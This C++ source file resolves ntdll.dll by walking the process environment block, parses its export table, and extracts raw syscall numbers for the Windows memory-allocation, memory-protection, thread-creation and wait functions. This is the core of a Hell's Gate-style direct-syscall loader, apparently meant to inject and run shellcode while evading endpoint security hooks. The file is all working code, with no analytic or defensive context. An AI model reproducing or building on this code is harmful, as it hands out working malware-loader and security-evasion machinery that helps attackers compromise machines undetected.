#include "pe_peb_parser.hpp"
#include "raii/raii_handle.hpp"
#include <handleapi.h>
#include <memoryapi.h>
#include <minwindef.h>
#include <processthreadsapi.h>
#include <stddef.h>
#include <stringapiset.h>
#include <tlhelp32.h>
#include <windows.h>
#include <winnt.h>
#include <winternl.h>

PVOID get_ntdll() {
#if defined(_WIN64)
  PPEB peb = (PPEB)__readgsqword(0x60);
#else
  PPEB peb = (PPEB)__readfsdword(0x30);
#endif
  const wchar_t *str = L"ntdll.dll";
  PPEB_LDR_DATA ldr = (PPEB_LDR_DATA)peb->Ldr;
  PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
  PLIST_ENTRY current = head->Flink;
  while (head != current) {
    PLDR_DATA_TABLE_ENTRY entry =
        CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    if (wcsstr(entry->FullDllName.Buffer, str)) {
      return entry->DllBase;
    }
    current = current->Flink;
  }
  return nullptr;
}

VOID parse_exports(PVOID nt_base, PVX_TABLE table) {
  PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)nt_base;
  PIMAGE_NT_HEADERS ntheaders =
      (PIMAGE_NT_HEADERS)((PBYTE)nt_base + dosheader->e_lfanew);
  PIMAGE_OPTIONAL_HEADER optheader =
      (PIMAGE_OPTIONAL_HEADER)&ntheaders->OptionalHeader;
  DWORD rva =
      optheader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
  PIMAGE_EXPORT_DIRECTORY export_dir =
      (PIMAGE_EXPORT_DIRECTORY)((PBYTE)nt_base + rva);

  PDWORD array_name = (PDWORD)((PBYTE)nt_base + export_dir->AddressOfNames);
  PWORD ordinal_array =
      (PWORD)((PBYTE)nt_base + export_dir->AddressOfNameOrdinals);
  PDWORD addresses_of_func_array =
      (PDWORD)((PBYTE)nt_base + export_dir->AddressOfFunctions);

  for (int i = 0; i < export_dir->NumberOfNames; i++) {
    PCHAR check_name = (PCHAR)((PBYTE)nt_base + array_name[i]);
    int func_index = -1;

    if (strcmp(check_name, "NtAllocateVirtualMemory") == 0)
      func_index = 0;
    else if (strcmp(check_name, "NtProtectVirtualMemory") == 0)
      func_index = 1;
    else if (strcmp(check_name, "NtCreateThreadEx") == 0)
      func_index = 2;
    else if (strcmp(check_name, "NtWaitForSingleObject") == 0)
      func_index = 3;

    if (func_index != -1) {
      WORD ordinal = ordinal_array[i];
      DWORD funcRVA = addresses_of_func_array[ordinal];
      PBYTE funcAddr = (PBYTE)nt_base + funcRVA;
      WORD syscall = 0;

      if (*funcAddr == 0xB8) {
        syscall = *(PWORD)(funcAddr + 1);
      } else if (*(funcAddr + 3) == 0xB8) {
        syscall = *(PWORD)(funcAddr + 4);
      }

      switch (func_index) {
      case 0:
        table->NtAllocateVirtualMemory.pAddress = funcAddr;
        table->NtAllocateVirtualMemory.wSystemCall = syscall;
        break;
      case 1:
        table->NtProtectVirtualMemory.pAddress = funcAddr;
        table->NtProtectVirtualMemory.wSystemCall = syscall;
        break;
      case 2:
        table->NtCreateThreadEx.pAddress = funcAddr;
        table->NtCreateThreadEx.wSystemCall = syscall;
        break;
      case 3:
        table->NtWaitForSingleObject.pAddress = funcAddr;
        table->NtWaitForSingleObject.wSystemCall = syscall;
        break;
      }
    }
  }
}
